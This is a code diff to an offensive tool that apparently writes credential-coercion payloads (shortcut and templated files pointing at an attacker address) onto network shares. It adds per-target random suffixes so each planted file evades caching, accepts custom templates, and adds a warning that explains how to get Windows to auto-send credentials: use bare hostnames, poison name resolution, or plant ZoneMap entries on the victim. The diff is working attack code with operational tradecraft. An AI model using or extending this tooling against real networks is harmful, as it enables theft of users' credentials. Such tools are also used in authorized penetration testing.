@@ -190,30 +190,37 @@ def handle_deploy(args, credentials):
         return
 
     payload_extension = Path(args.payload).suffix
-    template_path = Path(__file__).parent / f"template{payload_extension}"
+    template_path = _resolve_template_path(args, payload_extension)
     invisible = getattr(args, "invisible", False)
+    randomize_suffix = getattr(args, "randomize_suffix", False)
 
-    if payload_extension == ".lnk":
-        lnk_template = get_lnk_template(template_path)
-        payload_contents = create_lnk_payload(args.attacker, lnk_template)
-        if invisible:
-            logging.getLogger("main_logger").warning(
-                "--invisible only blanks the filename for .lnk payloads; "
-                "icon blanking is unsupported for binary lnk templates.",
-                extra={"path": args.payload},
-            )
+    # Intranet-zone preflight: HTTP/WebDAV credential auto-offer only fires
+    # when the attacker URL is in the Intranet zone. Bare hostnames are
+    # Intranet by default; IPs and FQDNs are Internet zone unless the
+    # victim has explicit ZoneMap entries.
+    if not _looks_intranet_zoned(args.attacker):
+        logging.getLogger("main_logger").warning(
+            "attacker target %r is not Intranet-zoned by default. Coercion "
+            "will reach the listener but Windows will not auto-offer "
+            "credentials. Use a bare hostname (no dots), poison name "
+            "resolution, or pre-stage ZoneMap entries on the victim.",
+            args.attacker, extra={"path": None},
+        )
+        print(
+            f"WARNING: attacker target {args.attacker!r} is not Intranet-zoned "
+            "by default; coercion will fire but no credentials will be sent.",
+            file=sys.stderr,
+        )
+
+    # Build the payload once if --randomize-suffix is off; otherwise build
+    # per-target inside the loop so every write is cache-distinct.
+    if not randomize_suffix:
+        payload_name, payload_contents = _build_payload_for_target(
+            args, payload_extension, template_path, invisible, suffix=None,
+        )
     else:
-        with open(template_path, "r", encoding="utf-8") as template_file:
-            template_contents = template_file.read()
-            payload_contents = template_contents.format(attacker_ip=args.attacker)
-        if invisible:
-            payload_contents = make_invisible_payload_contents(
-                payload_contents, payload_extension
-            )
-
-    payload_name = (
-        make_invisible_payload_name(args.payload) if invisible else args.payload
-    )
+        payload_name = None
+        payload_contents = None
     force = getattr(args, "force", False)
     encrypt = getattr(args, "encrypt", False)
     encrypt_keep = getattr(args, "encrypt_keep", False)
@@ -299,10 +306,18 @@ def handle_deploy(args, credentials):
                     time.sleep(wait)
             if jitter_hi > 0:
                 time.sleep(random.uniform(jitter_lo, jitter_hi) / 1000.0)
+            if randomize_suffix:
+                from linksiren.pure_functions import make_random_suffix
+                suffix = make_random_suffix(4)
+                this_name, this_contents = _build_payload_for_target(
+                    args, payload_extension, template_path, invisible, suffix=suffix,
+                )
+            else:
+                this_name, this_contents = payload_name, payload_contents
             new_payload_path = target.write_payload(
                 path=path,
-                payload_name=payload_name,
-                payload=payload_contents,
+                payload_name=this_name,
+                payload=this_contents,
                 force=force,
                 encrypt=encrypt,
                 encrypt_keep=encrypt_keep,
@@ -431,6 +446,71 @@ def handle_coerce(args, credentials):
         "cleanup --stop-efs revert).",
         file=sys.stderr,
     )
+
+
+def _resolve_template_path(args, payload_extension: str):
+    """Tester-supplied ``--template`` or the built-in for this extension."""
+    user_template = getattr(args, "template", None)
+    if user_template:
+        from pathlib import Path as _P
+        p = _P(user_template)
+        if not p.exists():
+            print(f"error: --template {user_template!r} not found", file=sys.stderr)
+            sys.exit(2)
+        if p.suffix != payload_extension:
+            print(
+                f"error: --template extension {p.suffix!r} does not match "
+                f"payload extension {payload_extension!r}",
+                file=sys.stderr,
+            )
+            sys.exit(2)
+        return p
+    return Path(__file__).parent / f"template{payload_extension}"
+
+
+def _looks_intranet_zoned(host: str) -> bool:
+    """Best-effort: True when ``host`` is a bare hostname (no dots, not IP)."""
+    import ipaddress
+    if not host:
+        return False
+    try:
+        ipaddress.ip_address(host)
+        return False
+    except ValueError:
+        pass
+    return "." not in host
+
+
+def _build_payload_for_target(
+    args, payload_extension: str, template_path, invisible: bool, suffix=None,
+):
+    """Build (payload_name, payload_contents) for a single target."""
+    from linksiren.pure_functions import (
+        apply_suffix_to_payload_name,
+        apply_suffix_to_payload_url_path,
+    )
+
+    if payload_extension == ".lnk":
+        lnk_template = get_lnk_template(template_path)
+        contents = create_lnk_payload(args.attacker, lnk_template)
+        if invisible:
+            logging.getLogger("main_logger").warning(
+                "--invisible only blanks the filename for .lnk payloads; "
+                "icon blanking is unsupported for binary lnk templates.",
+                extra={"path": args.payload},
+            )
+    else:
+        with open(template_path, "r", encoding="utf-8") as f:
+            template_contents = f.read()
+            contents = template_contents.format(attacker_ip=args.attacker)
+        if invisible:
+            contents = make_invisible_payload_contents(contents, payload_extension)
+
+    name = make_invisible_payload_name(args.payload) if invisible else args.payload
+    if suffix:
+        name = apply_suffix_to_payload_name(name, suffix)
+        contents = apply_suffix_to_payload_url_path(contents, payload_extension, suffix)
+    return name, contents
 
 
 def handle_target_sessions(args, credentials):
